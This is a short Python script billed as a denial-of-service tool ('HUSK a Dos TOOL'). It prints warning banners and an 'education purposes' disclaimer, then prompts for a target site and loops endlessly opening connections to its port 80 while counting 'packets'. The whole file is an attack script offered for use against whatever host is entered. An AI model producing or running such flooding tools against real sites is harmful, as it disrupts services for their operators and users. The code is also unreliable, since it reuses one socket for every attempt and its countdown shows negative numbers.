from re import S
import socket,time
from colorama import Fore
print(f"{Fore.CYAN} [!] HUSK a Dos TOOL")
print(f"{Fore.RED}!!!!!!!!!!!                          !!!!!!!!!!!!")
print(f"{Fore.RED} !!!!!!!!!                             !!!!!!!!!")
print(f"{Fore.RED}   !!!!!                                !!!!!")
print(f"{Fore.RED}     !!!!                              !!!!")
print(f"{Fore.RED}       !!!!                          !!!!")
print(f"{Fore.RED}         !!!!                      !!!!")
print(f"{Fore.RED}        !!############################!!")
print(f"{Fore.RED}        !!############################!!")
print(f"{Fore.RED}        !!##       ##########       ##!!")
print(f"{Fore.RED}        !!##  DOS  ##########  DOS  ##!!")
print(f"{Fore.RED}        !!##      ############      ##!!")
print(f"{Fore.RED}        !!############################!!")
print(f"{Fore.RED}        !!##########        ##########!!")
print(f"{Fore.RED}        !!###########      ###########!!")
print(f"{Fore.RED}        !!############################!!")
print(f"{Fore.RED}        !!###                      ###!!")
print(f"{Fore.RED}        !!###      !!DANGER!!      ###!!")
print(f"{Fore.RED}        !!############################!!")
print(f"{Fore.RED}          !!!!                    !!!!")
print(f"{Fore.RED}         !!!!                      !!!!")
print(f"{Fore.RED}        !!!!                        !!!!")
print(f"{Fore.RED}      !!!!!                          !!!!!")
print(f"{Fore.RED}  !!!!!!!!!!                        !!!!!!!!!")
print(f"{Fore.RED}!!!!!!!!!!!!!                      !!!!!!!!!!!!")
print(f"{Fore.GREEN}            [+] Author Pratv3 [+]")
print(f"{Fore.CYAN}    [!!] USE THIS FOR EDUCATION PURPOSES [!!]")
class Main:
    def __init__(self,host,tm):
        self.host=host
        self.tm=tm
        s=socket.gethostbyname(host)
        print(f"{Fore.RED}[+] Running infinite packets at server:- TRUE")
        for i in range(4):
            time.sleep(1.2)
            print(f"{Fore.CYAN} Launching attack in :-{i-4}",end="\r")
        soc=socket.socket()
        g=0
        print("\n")
        while True:
            g=g+1
            soc.connect_ex((s,80))
            if tm>0:
                time.sleep(tm)
                print(f"{Fore.RED}[+] Sending Packets:-{g}",end="\r")
            else:
                print(f"{Fore.RED}[+] Sending Packets:-{g}",end="\r")
ip=str(input(f"{Fore.LIGHTRED_EX}[+]Enter the URL or IP of the site:-"))
t=int(input(f"{Fore.LIGHTGREEN_EX}[+] Enter the timeout of the packet:-"))
Main(ip,t)
